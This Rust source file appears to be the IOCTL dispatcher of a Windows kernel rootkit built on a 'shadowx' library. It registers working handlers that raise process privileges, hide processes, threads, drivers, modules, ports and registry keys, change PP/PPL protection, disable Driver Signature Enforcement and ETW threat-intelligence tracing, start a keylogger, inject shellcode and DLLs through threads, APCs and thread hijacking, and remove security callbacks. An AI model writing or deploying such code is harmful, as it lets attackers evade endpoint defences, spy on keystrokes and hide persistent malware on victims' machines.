use alloc::{
    boxed::Box, 
    collections::btree_map::BTreeMap, 
    string::ToString, 
    vec::Vec
};

use shadowx::error::ShadowError;
use wdk_sys::*;
use spin::{Lazy, Mutex};
use core::sync::atomic::{AtomicPtr, Ordering};
use common::{
    ioctls::*, 
    enums::*, 
    structs::*
};

use crate::utils::{
    get_input_buffer, 
    get_output_buffer
};

use shadowx::{
    Process, Thread, 
    Network, network
};
use shadowx::{
    PROCESS_INFO_HIDE, 
    THREAD_INFO_HIDE
};

#[cfg(not(feature = "mapper"))]
use shadowx::registry::Type;

#[cfg(not(feature = "mapper"))]
use crate::callback::{driver, process, thread};

/// Static structure to store hidden driver information.
/// 
/// This structure keeps track of the drivers that have been hidden, including their
/// `LDR_DATA_TABLE_ENTRY` and the previous list entries in `PsLoadedModuleList`.
static DRIVER_INFO_HIDE: Lazy<Mutex<Vec<TargetDriver>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER))); 

/// Holds the user-mode address for keylogger functionality.
/// 
/// This static variable stores the address returned by the keylogger to map 
/// kernel memory to user space.
static mut USER_ADDRESS: usize = 0; 

/// Maximum number of drivers that can be tracked.
const MAX_DRIVER: usize = 100;

/// Type alias for an IOCTL handler function.
/// 
/// Each handler receives a pointer to an `IRP` (I/O Request Packet) and 
/// an `IO_STACK_LOCATION`, returning an `NTSTATUS` result.
type IoctlHandler = Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> Result<NTSTATUS, ShadowError> + Send + Sync>;

/// Type for mapping IOCTL control codes to their respective handlers.
type Ioctls = BTreeMap<u32, IoctlHandler>;

/// Manages IOCTL operations and handler registration.
pub struct IoctlManager {
    /// Stores the registered IOCTL handlers.
    handlers: Ioctls,
}

impl IoctlManager {
    /// Registers a new IOCTL handler.
    pub fn register_handler(&mut self, code: u32, handler: IoctlHandler) {
        self.handlers.insert(code, handler);
    }

    /// Retrieves the IOCTL handler for the given control code.
    pub fn get_handler(&self, control_code: u32) -> Option<&IoctlHandler> {
        self.handlers.get(&control_code)
    }

    /// Loads the IOCTL handlers into a `BTreeMap`.
    pub fn load_handlers(&mut self) {
        self.process();
        self.thread();
        self.callbacks();
        self.injection();
        self.module();
        self.port();
        self.driver();
        self.misc();

        #[cfg(not(feature = "mapper"))]
        {
            self.registry();
        }
    }

    /// Registers the IOCTL handlers for process-related operations.
    fn process(&mut self) {
        // Elevates the privileges of a specific process.
        self.register_handler(ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the process information from the input buffer.
                let target_process = get_input_buffer::<TargetProcess>(stack)?;
                let pid = (*target_process).pid;

                // Update the IoStatus with the size of the process information.
                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

                // Elevates the process privileges.
                Process::elevate_process(pid)
            }
        }));

        // Hide or Unhide the specified process.
        self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the process information from the input buffer.
                let target_process = get_input_buffer::<TargetProcess>(stack)?;
                let pid = (*target_process).pid;
                
                // Hide or unhide the process based on the 'enable' flag.
                let status = if (*target_process).enable {
                    // Hides the process and stores its previous state.
                    let previous_list = Process::hide_process(pid)?;
                    let mut process_info = PROCESS_INFO_HIDE.lock();
                    let list_ptr = Box::into_raw(Box::new(previous_list));

                    process_info.push(TargetProcess {
                        pid,
                        list_entry: AtomicPtr::new(list_ptr.cast()),
                        ..Default::default()
                    });

                    STATUS_SUCCESS
                } else {
                    // Unhides the process.
                    let list_entry = PROCESS_INFO_HIDE.lock()
                        .iter()
                        .find(|p| p.pid == pid)
                        .map(|process| process.list_entry.load(Ordering::SeqCst))
                        .ok_or(ShadowError::ProcessNotFound(pid.to_string()))?;

                    Process::unhide_process(pid, list_entry.cast())?
                };

                // Updates the IoStatus and returns the result of the operation.
                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
                Ok(status)
            }
        }));

        // Terminates the specified process.
        self.register_handler(TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the process information from the input buffer.
                let target_process = get_input_buffer::<TargetProcess>(stack)?;
                let pid = (*target_process).pid;

                // Update the IoStatus with the size of the process information.
                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

                // Terminates the process.
                Process::terminate_process(pid)
            }
        }));

        // Modifies the PP/PPL (Protection Signature) of a process.
        self.register_handler(SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the process information from the input buffer.
                let target_process = get_input_buffer::<TargetProcess>(stack)?;
                let pid = (*target_process).pid;
                let sg = (*target_process).sg;
                let tp = (*target_process).tp;

                // Updates the IoStatus with the size of the process information.
                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;

                // Modify the process's protection signature.
                Process::protection_signature(pid, sg, tp)
            }
        }));

        // Lists hidden and protected processes.
        self.register_handler(ENUMERATION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the output buffer to store process information.
                let (output_buffer, max_entries) = get_output_buffer::<TargetProcess>(irp, stack)?;
                let input_target = get_input_buffer::<TargetProcess>(stack)?;

                // Based on the options, either enumerate hidden or protected processes.
                let processes = match (*input_target).options {
                    Options::Hide => Process::enumerate_hide_processes(),
                    
                    #[cfg(not(feature = "mapper"))]
                    Options::Protection => process::enumerate_protection_processes(),
                    
                    #[cfg(feature = "mapper")]
                    _ => Vec::new(),
                };

                // Ensure we do not exceed buffer limits
                let entries_to_copy = core::cmp::min(processes.len(), max_entries);

                // Fill the output buffer with the enumerated processes' information.
                core::ptr::copy_nonoverlapping(processes.as_ptr(), output_buffer, entries_to_copy);

                // Updates the IoStatus with the size of the enumerated processes.
                (*irp).IoStatus.Information = (processes.len() * size_of::<TargetProcess>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // If the `mapper` feature is not enabled
        #[cfg(not(feature = "mapper"))] {
            // Add or remove shutdown/memory dump protection for a process.
            self.register_handler(PROTECTION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                unsafe {
                    // Retrieves the process information from the input buffer.
                    let process_protection = get_input_buffer::<TargetProcess>(stack)?;
                    let pid = (*process_protection).pid;
                    let enable = (*process_protection).enable;

                    // Adds or removes protection for the process based on the 'enable' flag.
                    let status = if enable {
                        process::add_pid(pid)
                    } else {
                        process::remove_pid(pid)
                    };

                    // Updates the IoStatus with the size of the process information.
                    (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
                    Ok(status)
                }
            }));
        }
    }

    /// Registers the IOCTL handlers for miscellaneous operations.
    fn misc(&mut self) {
        // Enable/Disable DSE (Driver Signature Enforcement).
        self.register_handler(ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer containing DSE information.
                let target_dse = get_input_buffer::<DSE>(stack)?;

                // Call to enable or disable DSE based on the input.
                let status = shadowx::Dse::set_dse_state((*target_dse).enable)?;

                // Set the number of bytes returned to the size of the ETWTI structure.
                (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;
                Ok(status)
            }
        }));

        // Start Keylogger: Maps the address for keylogger functionality to user space.
        self.register_handler(KEYLOGGER, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION| {
            unsafe {
                // If the USER_ADDRESS has not been set, retrieve it using the keylogger function.
                if USER_ADDRESS == 0 {
                    USER_ADDRESS = match shadowx::Keylogger::get_user_address_keylogger() {
                        Ok(addr) => addr as usize,
                        Err(err) => {
                            // Log the error and return a failure status if keylogger setup fails.
                            log::error!("Error get_user_address_keylogger: {err}");
                            return Ok(STATUS_UNSUCCESSFUL);
                        },
                    };
                }
        
                // Write the USER_ADDRESS to the output buffer provided by the IRP.
                let output_buffer = (*irp).AssociatedIrp.SystemBuffer;
                if !output_buffer.is_null() {
                    *(output_buffer as *mut usize) = USER_ADDRESS;
                }
        
                // Set the number of bytes returned to the size of a `usize`.
                (*irp).IoStatus.Information = size_of::<usize>() as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // Enable/Disable ETWTI.
        self.register_handler(ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer containing ETW tracing information.
                let target_etw = get_input_buffer::<ETWTI>(stack)?;

                // Call to enable or disable ETW tracing based on the input.
                let status = shadowx::Etw::etwti_enable_disable((*target_etw).enable)?;

                // Set the number of bytes returned to the size of the ETWTI structure.
                (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;         
                Ok(status)
            }
        }));
    }

    /// Registers the IOCTL handlers for port-related operations.
    fn port(&mut self) {
        // Handle port protection: hide port by toggling its status in the protected ports list.
        self.register_handler(HIDE_PORT, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Lock the list of protected ports to check if it's empty.
                let protected_ports = network::PROTECTED_PORTS.lock();
                
                // If the list is empty and the hook is not installed, install the hook.
                if protected_ports.is_empty() && !network::HOOK_INSTALLED.load(Ordering::Relaxed) {
                    Network::install_hook()?;
                }

                // Unlock the ports list.
                drop(protected_ports);

                // Get the target port from the input buffer.
                let target_port = get_input_buffer::<TargetPort>(stack)?;

                // Add or remove the target port from the protected list.
                let status = if (*target_port).enable {
                    network::add_port(target_port)
                } else {
                    network::remove_port(target_port)
                };
                
                // If the operation was successful and the list is now empty, uninstall the hook.
                if NT_SUCCESS(status) && network::PROTECTED_PORTS.lock().is_empty() && network::HOOK_INSTALLED.load(Ordering::Relaxed) {
                    Network::uninstall_hook()?;
                }

                // Set the number of bytes returned to the size of `TargetPort`.
                (*irp).IoStatus.Information = size_of::<TargetPort>() as u64;
                Ok(status)
            }
        }));
    }

    /// Registers the IOCTL handlers for module-related operations.
    fn module(&mut self) {
        // Enumerate loaded modules in the target process.
        self.register_handler(ENUMERATE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the target process from the input buffer
                let target_process = get_input_buffer::<TargetProcess>(stack)?;
                let (module_info, max_entries) = get_output_buffer::<ModuleInfo>(irp, stack)?;
                let pid = (*target_process).pid;

                // Enumerate modules in the process.
                let modules = shadowx::Module::enumerate_module(pid)?;

                // Ensure we do not exceed buffer limits
                let entries_to_copy = core::cmp::min(modules.len(), max_entries);

                // Populate the output buffer with module information
                for (index, module) in modules.iter().take(entries_to_copy).enumerate() {
                    let info_ptr = module_info.add(index);
        
                    // Ensure the name is not copied beyond the buffer size
                    let name_length = core::cmp::min(module.name.len(), (*info_ptr).name.len());
                    core::ptr::copy_nonoverlapping(module.name.as_ptr(), (*info_ptr).name.as_mut_ptr(), name_length);
        
                    // Copy other fields safely
                    (*info_ptr).address = module.address;
                    (*info_ptr).index = index as u8;
                }

                // Update IoStatus with the number of modules enumerated.
                (*irp).IoStatus.Information = (entries_to_copy * size_of::<ModuleInfo>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // Hide a specific module in the target process.
        self.register_handler(HIDE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the target module information from the input buffer.
                let target = get_input_buffer::<TargetModule>(stack)?;
                
                // Hide the module based on the PID and module name.
                let status = shadowx::Module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;

                // Update IoStatus to indicate success.
                (*irp).IoStatus.Information = size_of::<TargetModule>() as u64;
                Ok(status)
            }
        }));
    }

    /// Registers the IOCTL handlers for injection-related operations.
    fn injection(&mut self) {
        // Shellcode injection using a new thread (ZwCreateThreadEx).
        self.register_handler(INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer with the injection data.
                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
                let pid = (*input_buffer).pid;
                let path = (*input_buffer).path.as_str();

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

                // Perform shellcode injection using a new thread.
                shadowx::Shellcode::thread(pid, path)
            }
        }));

        // Shellcode injection via APC (Asynchronous Procedure Call).
        self.register_handler(INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer with the injection data.
                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
                let pid = (*input_buffer).pid;
                let path = (*input_buffer).path.as_str();

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

                // Perform shellcode injection via APC.
                shadowx::Shellcode::apc(pid, path)
            }
        }));

        // DLL injection using a new thread (ZwCreateThreadEx).
        self.register_handler(INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer with the injection data.
                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
                let pid = (*input_buffer).pid;
                let path = (*input_buffer).path.as_str();

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

                // Perform DLL injection using a new thread.
                shadowx::DLL::thread(pid, path)
            }
        }));

        // DLL injection using APC.
        self.register_handler(INJECTION_DLL_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer with the injection data.
                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
                let pid = (*input_buffer).pid;
                let path = (*input_buffer).path.as_str();

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

                // Perform DLL injection using APC
                shadowx::DLL::apc(pid, path)
            }
        }));

        //  Execute Shellcode with Thread Hijacking.
        self.register_handler(INJECTION_SHELLCODE_THREAD_HIJACKING, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the input buffer with the injection data.
                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
                let pid = (*input_buffer).pid;
                let path = (*input_buffer).path.as_str();

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;

                // Perform Thread Hijacking
                shadowx::Shellcode::thread_hijacking(pid, path)
            }
        }));
    }

    /// Registers the IOCTL handlers for driver-related operations.
    fn driver(&mut self) {
        // Hiding / Unhiding a driver from the PsLoadedModuleList.
        self.register_handler(HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                let target_driver = get_input_buffer::<TargetDriver>(stack)?;
                let driver_name = &(*target_driver).name;

                // Perform the operation based on whether we are hiding or unhiding the driver.
                let status = if (*target_driver).enable {
                    // Hide the driver and store its previous entries.
                    let (previous_list, previos_ldr_data) = shadowx::Driver::hide_driver(driver_name)?;
                    let mut driver_info = DRIVER_INFO_HIDE.lock();

                    // Store the previous list entry and LDR_DATA_TABLE_ENTRY for later restoration.
                    let ldr_data = Box::into_raw(Box::new(previos_ldr_data));
                    let list_entry = Box::into_raw(Box::new(previous_list));

                    driver_info.push(TargetDriver {
                        name: driver_name.clone(),
                        list_entry: AtomicPtr::new(list_entry.cast()),
                        driver_entry: AtomicPtr::new(ldr_data.cast()),
                        ..Default::default()
                    });

                    STATUS_SUCCESS
                } else {
                    // Unhide the driver by restoring its list entry and LDR_DATA_TABLE_ENTRY.
                    let (list_entry, ldr_data) = DRIVER_INFO_HIDE.lock()
                        .iter()
                        .find(|p| p.name == driver_name.to_string())
                        .map(|process| 
                            (process.list_entry.load(Ordering::SeqCst), 
                            process.driver_entry.load(Ordering::SeqCst)
                        ))
                        .ok_or(ShadowError::DriverNotFound(driver_name.to_string()))?;

                    shadowx::Driver::unhide_driver(driver_name, list_entry.cast(), ldr_data.cast())?
                };
                
                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<TargetDriver>() as u64;
                Ok(status)
            }
        }));

        // Enumerating active drivers on the system.
        self.register_handler(ENUMERATE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
            unsafe {
                // Get the output buffer for returning the driver information.
                let (driver_info, max_entries) = get_output_buffer::<DriverInfo>(irp, stack)?;

                // Enumerate the drivers currently loaded in the system.
                let drivers = shadowx::Driver::enumerate_driver()?;

                // Copy only what fits in the user buffer
                let entries_to_copy = core::cmp::min(drivers.len(), max_entries);
                core::ptr::copy_nonoverlapping(drivers.as_ptr(), driver_info, entries_to_copy);

                // Set the size of the returned information.
                (*irp).IoStatus.Information = (entries_to_copy * size_of::<DriverInfo>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // If the `mapper` feature is not enabled
        #[cfg(not(feature = "mapper"))] {
            self.register_handler(BLOCK_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                unsafe {
                    let target_driver = get_input_buffer::<TargetDriver>(stack)?;
                    let driver_name = &(*target_driver).name;
    
                    let status = if (*target_driver).enable {
                        driver::add_driver(driver_name.to_string())
                    } else {
                        driver::remove_driver(driver_name)
                    };
    
                    // Set the size of the returned information.
                    (*irp).IoStatus.Information = size_of::<TargetDriver>() as u64;
                    Ok(status)
                }
            }));
        }
    }

    /// Registers the IOCTL handlers for thread-related operations.
    fn thread(&mut self) {
        // Hide the specified Thread by removing it from the list of active threads.
        self.register_handler(HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the thread information from the input buffer.
                let target_thread = get_input_buffer::<TargetThread>(stack)?;
                let tid = (*target_thread).tid;

                // Hide or unhide the thread based on the 'enable' flag.
                let status = if (*target_thread).enable {
                    // Hides the thread and stores its previous state.
                    let previous_list = Thread::hide_thread(tid)?;
                    let mut process_info = THREAD_INFO_HIDE.lock();
                    let list_ptr = Box::into_raw(Box::new(previous_list));
            
                    process_info.push(TargetThread  {
                        tid,
                        list_entry: AtomicPtr::new(list_ptr.cast()),
                        ..Default::default()
                    });
            
                    STATUS_SUCCESS
                } else {
                    // Unhides the thread.
                    let list_entry = THREAD_INFO_HIDE.lock()
                        .iter()
                        .find(|p| p.tid == tid)
                        .map(|thread| thread.list_entry.load(Ordering::SeqCst))
                        .ok_or(ShadowError::ThreadNotFound(tid))?;

                    Thread::unhide_thread(tid, list_entry.cast())?
                };
                
                // Updates the IoStatus and returns the result of the operation.
                (*irp).IoStatus.Information = size_of::<TargetThread>() as u64;
                Ok(status)
            }
        }));

        // List hidden or protected threads.
        self.register_handler(ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the output buffer to store thread information.
                let (output_buffer, max_entries) = get_output_buffer::<TargetThread>(irp, stack)?;
                let input_target = get_input_buffer::<TargetThread>(stack)?;

                // Based on the options, either enumerate hidden or protected threads.
                let threads = match (*input_target).options {
                    Options::Hide => Thread::enumerate_hide_threads(),
                    
                    #[cfg(not(feature = "mapper"))]
                    Options::Protection => thread::enumerate_protection_thread(),
                    
                    #[cfg(feature = "mapper")]
                    _ => Vec::new(),
                };

                // Copy only what fits in the user buffer
                let entries_to_copy = core::cmp::min(threads.len(), max_entries);
                core::ptr::copy_nonoverlapping(threads.as_ptr(), output_buffer, entries_to_copy);

                // Updates the IoStatus with the size of the enumerated threads.
                (*irp).IoStatus.Information = (entries_to_copy * size_of::<TargetThread>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // If the feature is a mapper, these functionalities will not be added.
        #[cfg(not(feature = "mapper"))] {
            // Responsible for adding thread termination protection.
            self.register_handler(PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                unsafe {
                    // Retrieves the thread information from the input buffer.
                    let thread_protection = get_input_buffer::<TargetThread>(stack)?;
                    let tid = (*thread_protection).tid;
                    let enable = (*thread_protection).enable;

                    // Adds or removes protection for the thread based on the 'enable' flag.
                    let status = if enable {
                        thread::add_target_tid(tid)
                    } else {
                        thread::remove_target_tid(tid)
                    };

                    // Updates the IoStatus with the size of the thread information.
                    (*irp).IoStatus.Information = size_of::<TargetThread>() as u64;
                    Ok(status)
                }
            }));
        }
    }
    
    /// Registers the IOCTL handlers for callback-related operations.
    fn callbacks(&mut self) {
        // Lists Callbacks.
        self.register_handler(ENUMERATE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
                let (callback_info, max_entries) = get_output_buffer::<CallbackInfoOutput>(irp, stack)?;
                let callbacks = match (*target_callback).callback {
                    Callbacks::PsSetCreateProcessNotifyRoutine 
                    | Callbacks::PsSetCreateThreadNotifyRoutine
                    | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::enumerate((*target_callback).callback)?,

                    Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::enumerate((*target_callback).callback)?,
                    
                    Callbacks::ObProcess
                    | Callbacks::ObThread => shadowx::CallbackOb::enumerate((*target_callback).callback)?,
                };

                // Ensure we do not exceed buffer limits
                let entries_to_copy = core::cmp::min(callbacks.len(), max_entries);

                for (index, callback) in callbacks.iter().take(entries_to_copy).enumerate() {
                    let info_ptr = callback_info.add(index);
    
                    // Ensure the name is not copied beyond the buffer size
                    let name_length = core::cmp::min(callback.name.len(), (*info_ptr).name.len());
                    core::ptr::copy_nonoverlapping(callback.name.as_ptr(), (*info_ptr).name.as_mut_ptr(), name_length);
    
                    // Copy other fields safely
                    (*info_ptr).address = callback.address;
                    (*info_ptr).index = index as u8;
                    (*info_ptr).pre_operation = callback.pre_operation;
                    (*info_ptr).post_operation = callback.post_operation;
                }

                // Set the size of the returned information.
                (*irp).IoStatus.Information = (entries_to_copy * size_of::<CallbackInfoOutput>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));

        // Remove Callback.
        self.register_handler(REMOVE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
                let status = match (*target_callback).callback {
                    Callbacks::PsSetCreateProcessNotifyRoutine 
                    | Callbacks::PsSetCreateThreadNotifyRoutine
                    | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::remove((*target_callback).callback, (*target_callback).index)?,
                    
                    Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::remove((*target_callback).callback, (*target_callback).index)?,
                    
                    Callbacks::ObProcess
                    | Callbacks::ObThread => shadowx::CallbackOb::remove((*target_callback).callback, (*target_callback).index)?,
                };

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<CallbackInfoInput>() as u64;
                Ok(status)
            }
        }));

        // Restore Callback.
        self.register_handler(RESTORE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
                let status = match (*target_callback).callback {
                    Callbacks::PsSetCreateProcessNotifyRoutine 
                    | Callbacks::PsSetCreateThreadNotifyRoutine
                    | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::restore((*target_callback).callback, (*target_callback).index)?,
                    
                    Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::restore((*target_callback).callback, (*target_callback).index)?,
                    
                    Callbacks::ObProcess
                    | Callbacks::ObThread => shadowx::CallbackOb::restore((*target_callback).callback, (*target_callback).index)?,
                };

                // Set the size of the returned information.
                (*irp).IoStatus.Information = size_of::<CallbackInfoInput>() as u64;
                Ok(status)
            }
        }));

        // List Callbacks Removed.
        self.register_handler(ENUMERATE_REMOVED_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
                let (callback_info, max_entries) = get_output_buffer::<CallbackInfoOutput>(irp, stack)?;
                let callbacks = match (*target_callback).callback {
                    Callbacks::PsSetCreateProcessNotifyRoutine 
                    | Callbacks::PsSetCreateThreadNotifyRoutine
                    | Callbacks::PsSetLoadImageNotifyRoutine => shadowx::Callback::enumerate_removed()?,
                    
                    Callbacks::CmRegisterCallbackEx => shadowx::CallbackRegistry::enumerate_removed()?,
                    
                    Callbacks::ObProcess
                    | Callbacks::ObThread => shadowx::CallbackOb::enumerate_removed()?,
                };

                // Ensure we do not exceed buffer limits
                let entries_to_copy = core::cmp::min(callbacks.len(), max_entries);
                for (index, callback) in callbacks.iter().take(entries_to_copy).enumerate() {
                    let info_ptr = callback_info.add(index);
        
                    // Ensure the name is not copied beyond the buffer size
                    let name_length = core::cmp::min(callback.name.len(), (*info_ptr).name.len());
                    core::ptr::copy_nonoverlapping(callback.name.as_ptr(), (*info_ptr).name.as_mut_ptr(), name_length);
        
                    // Copy other fields safely
                    (*info_ptr).address = callback.address;
                    (*info_ptr).index = callback.index;
                    (*info_ptr).pre_operation = callback.pre_operation;
                    (*info_ptr).post_operation = callback.post_operation;
                }
            
                // Set the size of the returned information.
                (*irp).IoStatus.Information = (entries_to_copy * size_of::<CallbackInfoOutput>()) as u64;
                Ok(STATUS_SUCCESS)
            }
        }));
    }

    /// Registers the IOCTL handlers for registry-related operations.
    #[cfg(not(feature = "mapper"))]
    fn registry(&mut self) {
        // Adding protection for registry key values.
        self.register_handler(REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
                let status = shadowx::Registry::modify_key_value(target_registry, Type::Protect);

                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                Ok(status)
            }
        }));
        
        // Added protection for registry keys.
        self.register_handler(REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
                let status = shadowx::Registry::modify_key(target_registry, Type::Protect);

                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                Ok(status)
            }
        }));

        // Handles IOCTL to hide or unhide a registry key.
        self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
                let status = shadowx::Registry::modify_key(target_registry, Type::Hide);

                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                Ok(status)
            }
        }));

        // Handles IOCTL to hide or unhide a registry value.
        self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
                let status = shadowx::Registry::modify_key_value(target_registry, Type::Hide);

                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
                Ok(status)
            }
        }));
    }
}

impl Default for IoctlManager {
    /// Creates a new IoctlManager with an empty handler map.
    fn default() -> Self {
        Self {
            handlers: Ioctls::new(),
        }
    }
}
